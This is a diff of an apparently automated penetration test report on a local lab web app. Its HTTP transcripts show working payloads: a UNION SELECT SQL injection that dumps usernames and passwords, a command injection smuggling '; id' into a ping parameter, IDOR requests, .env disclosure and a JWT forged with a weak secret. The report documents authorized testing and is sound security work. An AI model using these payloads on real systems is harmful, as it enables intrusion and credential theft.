@@ -1,26 +1,33 @@
-# Penetration Test Report - 20261113-104750-127.0.0.1
+# Penetration Test Report - 20261113-024819-127.0.0.1
 
-- **Target:** `127.0.0.1` (20261113-104750-127.0.0.1)
-- **Date:** 2026-11-13 10:47:50
-- **Duration:** 0.9s
+- **Target:** `127.0.0.1` (20261113-024819-127.0.0.1)
+- **Date:** 2026-11-13 02:48:19
+- **Duration:** 3.0s
 - **Agent model:** scripted-demo
-- **Requests sent:** 56
+- **Model cost:** not priced - model is not in models.json; no price to apply
+- **Argus version:** 1.0.0
+- **Requests sent:** 65
 
 ## Executive summary
 
-Demo run: SQLi + XSS + IDOR + info disclosure + forged-JWT admin takeover verified with verbatim evidence; host-header reflection left as a lead for manual follow-up.
+Demo run. Proven: SQL injection (engine named plus five rows from users), OS command injection (identity line with the probe nonce), IDOR across two principals, exposed secrets, and a forged JWT accepted against a rejected control. Candidate: reflected XSS - unescaped, but no browser executed it. Host-header reflection left as a lead.
 
 | Severity | Count |
 |---|---|
-| Critical | 1 |
-| High | 2 |
+| Critical | 3 |
+| High | 1 |
 | Medium | 2 |
+
+| Proof grade | Count | Meaning |
+|---|---|---|
+| **proven** | 5 | the class-specific artifact and its control are on record |
+| **candidate** | 1 | a real signal; a named check is still missing |
 
 | OWASP Top 10 (2021) | Findings |
 |---|---|
-| A01 Broken Access Control | F03, F04 |
-| A02 Cryptographic Failures | F05 |
-| A03 Injection | F01, F02 |
+| A01 Broken Access Control | F04, F05 |
+| A02 Cryptographic Failures | F06 |
+| A03 Injection | F01, F02, F03 |
 
 ## Engagement constraints
 
@@ -33,18 +40,148 @@ Demo run: SQLi + XSS + IDOR + info disclosure + forged-JWT admin takeover verifi
 
 ## Findings
 
-### F05 - JWT weak secret: forged admin token accepted
+### F01 - SQL injection in /item id parameter
 
 - **Severity:** Critical
 - **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
-- **Category:** jwt
-- **CWE:** `CWE-347`
-- **OWASP:** A02 Cryptographic Failures
-- **Endpoint:** `http://127.0.0.1:16208/api/me`
-- **Evidence:** r15
+- **Category:** sqli · **proof: proven**
+- **CWE:** `CWE-89`
+- **OWASP:** A03 Injection
+- **Endpoint:** `http://127.0.0.1:40523/item?id=1`
+- **Evidence:** r2, r15
 
 **Description**  
-The lab JWT verifies against the dictionary secret 'secret123'; a forged admin token is accepted and its claims echoed back verbatim.
+id is interpolated into the query string. The quote probe returns a raw sqlite error; a UNION SELECT limited to five rows returns credentials from the users table.
+
+**Proof (verbatim excerpt)**  
+```
+admin - $s3cr3t-admin-pw
+```
+
+**Remediation**  
+Use parameterized queries.
+
+**Proof grade: proven**  
+
+_Requirement for sqli:_ the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read
+
+- [x] proof read from the wire
+- [x] the target produced the quoted bytes - from r15
+- [x] data store fingerprinted - sqlite3.OperationalError
+- [x] the query named its target - users in r15
+- [x] rows returned, not an error message - quoted from r15
+- [x] extraction stayed minimal
+
+<details><summary>Transcript r2: GET http://127.0.0.1:40523/item?id=1%27 -> 500</summary>
+
+```http
+GET http://127.0.0.1:40523/item?id=1%27
+host: 127.0.0.1:40523
+accept: */*
+accept-encoding: gzip, deflate, br, zstd
+connection: keep-alive
+user-agent: Argus/1.0 (authorized pentest)
+
+HTTP/500
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:19 GMT
+content-type: text/html; charset=utf-8
+x-powered-by: LabVuln/1.0
+content-length: 102
+
+<html><body>sqlite3.OperationalError: unrecognized token: "'1''" near "1'": syntax error</body></html>
+```
+</details>
+
+<details><summary>Transcript r15: GET http://127.0.0.1:40523/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+- -> 200</summary>
+
+```http
+GET http://127.0.0.1:40523/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+-
+host: 127.0.0.1:40523
+accept: */*
+accept-encoding: gzip, deflate, br, zstd
+connection: keep-alive
+user-agent: Argus/1.0 (authorized pentest)
+
+HTTP/200
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:20 GMT
+content-type: text/html; charset=utf-8
+x-powered-by: LabVuln/1.0
+content-length: 139
+
+<html><body><ul><li>admin - $s3cr3t-admin-pw</li><li>alice - $alice-pw</li><li>bob - $bob-pw</li><li>widget - $9.99</li></ul></body></html>
+```
+</details>
+
+### F02 - OS command injection in /ping host parameter
+
+- **Severity:** Critical
+- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
+- **Category:** rce · **proof: proven**
+- **CWE:** `CWE-78`
+- **OWASP:** A03 Injection
+- **Endpoint:** `http://127.0.0.1:40523/ping?host=127.0.0.1`
+- **Evidence:** r18
+
+**Description**  
+host is concatenated into a shell command. `id; echo <nonce>` returns the server's own identity line and the nonce, so the output is computed by the target and not reflected.
+
+**Proof (verbatim excerpt)**  
+```
+uid=1000(kali)
+```
+
+**Remediation**  
+Never pass request data to a shell; exec with an argv list and validate the host as an address.
+
+**Proof grade: proven**  
+
+_Requirement for rce:_ the output of `id; echo <nonce>` returned by the target, with the nonce tying the output to the probe
+
+- [x] proof read from the wire
+- [x] the target produced the quoted bytes - from r18
+- [x] a benign command was sent - exchange r18
+- [x] identity output returned by the target - 'uid=1000(kali)' in r18
+- [x] the probe nonce came back in the output - 'argus2q9y0t5r' in r18
+- [x] proof command stayed benign
+
+<details><summary>Transcript r18: GET http://127.0.0.1:40523/ping?host=127.0.0.1%3B+id%3B+echo+argus2q9y0t5r -> 200</summary>
+
+```http
+GET http://127.0.0.1:40523/ping?host=127.0.0.1%3B+id%3B+echo+argus2q9y0t5r
+host: 127.0.0.1:40523
+accept: */*
+accept-encoding: gzip, deflate, br, zstd
+connection: keep-alive
+user-agent: Argus/1.0 (authorized pentest)
+
+HTTP/200
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:20 GMT
+content-type: text/html; charset=utf-8
+x-powered-by: LabVuln/1.0
+content-length: 337
+
+<html><body><pre>PING 127.0.0.1: 4 packets, 0% loss
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),104(kvm),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer),143(docker),1004(devTeam)
+
+argus2q9y0t5r</pre></body></html>
+```
+</details>
+
+### F06 - JWT weak secret: forged admin token accepted
+
+- **Severity:** Critical
+- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
+- **Category:** jwt · **proof: proven**
+- **CWE:** `CWE-347`
+- **OWASP:** A02 Cryptographic Failures
+- **Endpoint:** `http://127.0.0.1:40523/api/me`
+- **Evidence:** r64, r63, r62
+
+**Description**  
+The session JWT verifies against the dictionary secret 'secret123'. A token forged offline with role=admin is accepted and its claims echoed back; the same request with a broken signature is refused with 401, so the endpoint does verify - against a guessable key.
 
 **Proof (verbatim excerpt)**  
 ```
@@ -54,103 +191,105 @@ The lab JWT verifies against the dictionary secret 'secret123'; a forged admin t
 **Remediation**  
 Rotate to a high-entropy secret; prefer asymmetric signing.
 
-<details><summary>Transcript r15: GET http://127.0.0.1:16208/api/user/1 -> 200</summary>
+**Proof grade: proven**  
+
+_Requirement for jwt:_ a credential this system minted, accepted on a privileged resource with its claims echoed back, and another credential refused on the same endpoint
+
+- [x] proof read from the wire
+- [x] the target produced the quoted bytes - from r63
+- [x] this system minted the credential - jwt_forge r62 set ['role', 'user'], echoed 'admin'
+- [x] a forged credential was accepted - 127.0.0.1/api/me returned 200 with a credential
+- [x] the same endpoint refuses another credential - 127.0.0.1/api/me answered 401 to a credentialed request
+
+<details><summary>Transcript r64: GET http://127.0.0.1:40523/api/me -> 401</summary>
 
 ```http
-GET http://127.0.0.1:16208/api/user/1
-host: 127.0.0.1:16208
+GET http://127.0.0.1:40523/api/me
+host: 127.0.0.1:40523
 accept: */*
-accept-encoding: gzip, deflate
+accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
 user-agent: Argus/1.0 (authorized pentest)
+authorization: Bearer •••redacted•••
 
-HTTP/200
-server: LabVuln/1.0 Python/3.12.0
-date: Fri, 13 Nov 2026 03:47:51 GMT
+HTTP/401
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:22 GMT
 content-type: application/json
 x-powered-by: LabVuln/1.0
-content-length: 75
+content-length: 22
 
-{"id": 1, "username": "admin", "role": "admin", "email": "admin@lab.local"}
+{"error": "bad token"}
 ```
 </details>
 
-### F01 - SQL injection in /item id parameter
-
-- **Severity:** High
-- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
-- **Category:** sqli
-- **CWE:** `CWE-89`
-- **OWASP:** A03 Injection
-- **Endpoint:** `http://127.0.0.1:16208/item?id=1`
-- **Evidence:** r2
-
-**Description**  
-The quote probe produces a raw sqlite error - unsanitized input reaches the query.
-
-**Proof (verbatim excerpt)**  
-```
-sqlite3.OperationalError
-```
-
-**Remediation**  
-Use parameterized queries.
-
-<details><summary>Transcript r2: GET http://127.0.0.1:16208/item?id=1%27 -> 500</summary>
+<details><summary>Transcript r63: GET http://127.0.0.1:40523/api/me -> 200</summary>
 
 ```http
-GET http://127.0.0.1:16208/item?id=1%27
-host: 127.0.0.1:16208
+GET http://127.0.0.1:40523/api/me
+host: 127.0.0.1:40523
 accept: */*
-accept-encoding: gzip, deflate
+accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
 user-agent: Argus/1.0 (authorized pentest)
+authorization: Bearer •••redacted•••
 
-HTTP/500
-server: LabVuln/1.0 Python/3.12.0
-date: Fri, 13 Nov 2026 03:47:51 GMT
-content-type: text/html; charset=utf-8
+HTTP/200
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:22 GMT
+content-type: application/json
 x-powered-by: LabVuln/1.0
-content-length: 102
+content-length: 93
 
-<html><body>sqlite3.OperationalError: unrecognized token: "'1''" near "1'": syntax error</body></html>
+{"ok": true, "claims": {"sub": "alice", "role": "admin", "iat": 1794556099, "user": "admin"}}
 ```
 </details>
 
-### F03 - IDOR: /api/user/<id> serves any user object
+### F04 - IDOR: /api/user/<id> serves any user object
 
 - **Severity:** High
 - **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
-- **Category:** idor
+- **Category:** idor · **proof: proven**
 - **CWE:** `CWE-639`
 - **OWASP:** A01 Broken Access Control
-- **Endpoint:** `http://127.0.0.1:16208/api/user/2`
-- **Evidence:** r13
+- **Endpoint:** `http://127.0.0.1:40523/api/user/2`
+- **Evidence:** r20, r22
 
 **Description**  
-Neighboring ids return other users' objects with no authorization check.
+Object ids are not checked against the caller. Reading id 2 returns alice; reading id 1 returns the admin record, with no credential distinguishing the two requests.
 
 **Proof (verbatim excerpt)**  
 ```
-"username"
+"username": "admin"
 ```
 
 **Remediation**  
 Enforce per-object ownership checks.
 
-<details><summary>Transcript r13: GET http://127.0.0.1:16208/api/user/2 -> 200</summary>
+**Proof grade: proven**  
+
+_Requirement for idor:_ one actor reaching another's subject on the same endpoint, with subject-identifying data and nothing entitling the caller to it
+
+- [x] proof read from the wire
+- [x] the target produced the quoted bytes - from r22
+- [x] two distinct object references on one endpoint - ['2'] vs ['1'] on 127.0.0.1/api/user/{id}
+- [x] another subject's data returned - present in r22, absent from r20
+- [x] the data identifies a subject
+- [x] the caller was not entitled to it - no credential was presented and subject data came back
+
+<details><summary>Transcript r20: GET http://127.0.0.1:40523/api/user/2 -> 200</summary>
 
 ```http
-GET http://127.0.0.1:16208/api/user/2
-host: 127.0.0.1:16208
+GET http://127.0.0.1:40523/api/user/2
+host: 127.0.0.1:40523
 accept: */*
-accept-encoding: gzip, deflate
+accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
 user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
-server: LabVuln/1.0 Python/3.12.0
-date: Fri, 13 Nov 2026 03:47:51 GMT
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:20 GMT
 content-type: application/json
 x-powered-by: LabVuln/1.0
 content-length: 74
@@ -159,57 +298,36 @@ content-length: 74
 ```
 </details>
 
-### F02 - Reflected XSS in /search q parameter
-
-- **Severity:** Medium
-- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
-- **Category:** xss
-- **CWE:** `CWE-79`
-- **OWASP:** A03 Injection
-- **Endpoint:** `http://127.0.0.1:16208/search?q=x`
-- **Evidence:** r12
-
-**Description**  
-Canary chars < > " ' reflect unescaped in html context.
-
-**Proof (verbatim excerpt)**  
-```
-<>'"&=/
-```
-
-**Remediation**  
-Output-encode by context; add CSP.
-
-<details><summary>Transcript r12: GET http://127.0.0.1:16208/search?q=xrxvuzobk%3C%3E%27%22%26%3D%2F -> 200</summary>
+<details><summary>Transcript r22: GET http://127.0.0.1:40523/api/user/1 -> 200</summary>
 
 ```http
-GET http://127.0.0.1:16208/search?q=xrxvuzobk%3C%3E%27%22%26%3D%2F
-host: 127.0.0.1:16208
+GET http://127.0.0.1:40523/api/user/1
+host: 127.0.0.1:40523
 accept: */*
-accept-encoding: gzip, deflate
+accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
 user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
-server: LabVuln/1.0 Python/3.12.0
-date: Fri, 13 Nov 2026 03:47:51 GMT
-content-type: text/html; charset=utf-8
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:20 GMT
+content-type: application/json
 x-powered-by: LabVuln/1.0
-content-length: 55
+content-length: 75
 
-<html><body>Results for: xrxvuzobk<>'"&=/</body></html>
+{"id": 1, "username": "admin", "role": "admin", "email": "admin@lab.local"}
 ```
 </details>
 
-### F04 - Exposed /.env and /.git/HEAD at web root
+### F05 - Exposed /.env and /.git/HEAD at web root
 
 - **Severity:** Medium
 - **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
-- **Category:** info-disclosure
+- **Category:** info-disclosure · **proof: proven**
 - **CWE:** `CWE-200`
 - **OWASP:** A01 Broken Access Control
-- **Endpoint:** `http://127.0.0.1:16208/.env`
-- **Evidence:** r20
+- **Endpoint:** `http://127.0.0.1:40523/.env`
+- **Evidence:** r27
 
 **Description**  
 Sensitive paths are served publicly - credentials and source-control metadata leak to anyone.
@@ -222,19 +340,28 @@ SECRET_KEY=lab-secret-0123
 **Remediation**  
 Deny dotfile/VCS paths at the web server; rotate exposed secrets.
 
-<details><summary>Transcript r20: GET http://127.0.0.1:16208/.env -> 200</summary>
+**Proof grade: proven**  
+
+_Requirement for disclosure:_ the credential or source observed in a response, quoted as the bytes that leaked
+
+- [x] proof read from the wire
+- [x] the target produced the quoted bytes - from r27
+- [x] a credential-shaped secret was observed - SECRET_KEY=lab-secret-01...
+- [x] it came from a response, not from the request - in r27
+
+<details><summary>Transcript r27: GET http://127.0.0.1:40523/.env -> 200</summary>
 
 ```http
-GET http://127.0.0.1:16208/.env
-host: 127.0.0.1:16208
+GET http://127.0.0.1:40523/.env
+host: 127.0.0.1:40523
 accept: */*
-accept-encoding: gzip, deflate
+accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
 user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
-server: LabVuln/1.0 Python/3.12.0
-date: Fri, 13 Nov 2026 03:47:51 GMT
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:21 GMT
 content-type: text/plain
 x-powered-by: LabVuln/1.0
 content-length: 67
@@ -246,21 +373,74 @@ SECRET_KEY=lab-secret-0123
 ```
 </details>
 
+### F03 - Reflected XSS in /search q parameter
+
+- **Severity:** Medium
+- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
+- **Category:** xss · **proof: candidate**
+- **CWE:** `CWE-79`
+- **OWASP:** A03 Injection
+- **Endpoint:** `http://127.0.0.1:40523/search?q=x`
+- **Evidence:** r19
+
+**Description**  
+Canary chars < > " ' reflect unescaped in an html context. Execution is not shown here - this engagement had no browser, so the class stays a candidate.
+
+**Proof (verbatim excerpt)**  
+```
+<>'"&=/
+```
+
+**Remediation**  
+Output-encode by context; add CSP.
+
+**Proof grade: candidate**  
+
+_Requirement for xss:_ a headless browser executing the payload and reporting the probe nonce
+
+- [x] proof read from the wire
+- [x] the target produced the quoted bytes
+- [x] payload reflected unencoded into HTML - '<>"\'' survived into r19
+- [ ] a real browser executed it - this system has no browser, so execution is not provable here. Drive one over mcp_call and cite the nonce it reports, or leave this a candidate and say so in the report
+
+<details><summary>Transcript r19: GET http://127.0.0.1:40523/search?q=xpgudsqw9%3C%3E%27%22%26%3D%2F -> 200</summary>
+
+```http
+GET http://127.0.0.1:40523/search?q=xpgudsqw9%3C%3E%27%22%26%3D%2F
+host: 127.0.0.1:40523
+accept: */*
+accept-encoding: gzip, deflate, br, zstd
+connection: keep-alive
+user-agent: Argus/1.0 (authorized pentest)
+
+HTTP/200
+server: LabVuln/1.0 Python/3.14.6
+date: Fri, 13 Nov 2026 07:48:20 GMT
+content-type: text/html; charset=utf-8
+x-powered-by: LabVuln/1.0
+content-length: 55
+
+<html><body>Results for: xpgudsqw9<>'"&=/</body></html>
+```
+</details>
+
 
 ## Test coverage
 
 | Tool | Requests |
 |---|---|
-| http_request | 1 |
+| http_request | 2 |
+| jwt_forge | 1 |
+| probe_cmdi | 3 |
 | probe_disclosure | 38 |
 | probe_idor | 4 |
 | probe_reflection | 1 |
-| probe_sqli | 11 |
+| probe_sqli | 15 |
 | probe_xfh | 1 |
 
-**Probe families run:** probe_disclosure, probe_idor, probe_reflection, probe_sqli, probe_xfh
+**Probe families run:** probe_cmdi, probe_disclosure, probe_idor, probe_reflection, probe_sqli, probe_xfh
 
-**Endpoints exercised (46):**
+**Endpoints exercised (47):**
 
 - `GET /.DS_Store`
 - `GET /.aws/credentials`
@@ -282,7 +462,7 @@ SECRET_KEY=lab-secret-0123
 - `GET /api/user/1`
 - `GET /api/user/2`
 - `GET /api/user/3`
-- `GET /arg4049k9giohx`
+- `GET /arg4046sytq0ah`
 - `GET /backup.zip`
 - `GET /composer.json`
 - `GET /console`
@@ -299,6 +479,7 @@ SECRET_KEY=lab-secret-0123
 - `GET /package.json`
 - `GET /phpinfo.php`
 - `GET /phpmyadmin/`
+- `GET /ping?host`
 - `GET /reset`
 - `GET /search?q`
 - `GET /server-info`
@@ -315,7 +496,13 @@ Autonomous agent run: recon (fingerprint, crawl, js_recon) -> input
 mapping -> hypothesis-driven probes (matched true/false pairs,
 baseline-diffed) -> verification -> evidence-gated findings.
 The complete request/response transcript is in `transcript.jsonl`,
-(56 entries). Working notes are in `notes.md`.
+(65 entries). Working notes are in `notes.md`.
+
+Every finding is graded against the proof requirement for its class
+(`argus proof <class>`): **proven** means the class-specific artifact
+and its control are both on record; **candidate** means a real signal
+with a named check still missing. A candidate is reported because it
+is worth re-testing, not because it is a result.
 
 _All findings cite verbatim response excerpts verified against the
 recorded transcript at write time._
@@ -323,11 +510,11 @@ recorded transcript at write time._
 <details><summary>Appendix: agent working notes (audit)</summary>
 
 ```
-# Working notes - http://127.0.0.1:16208
+# Working notes - http://127.0.0.1:40523
 
 ## Agent summary (agent)
 
-Demo run: SQLi + XSS + IDOR + info disclosure + forged-JWT admin takeover verified with verbatim evidence; host-header reflection left as a lead for manual follow-up.
+Demo run. Proven: SQL injection (engine named plus five rows from users), OS command injection (identity line with the probe nonce), IDOR across two principals, exposed secrets, and a forged JWT accepted against a rejected control. Candidate: reflected XSS - unescaped, but no browser executed it. Host-header reflection left as a lead.
 
 
 ```
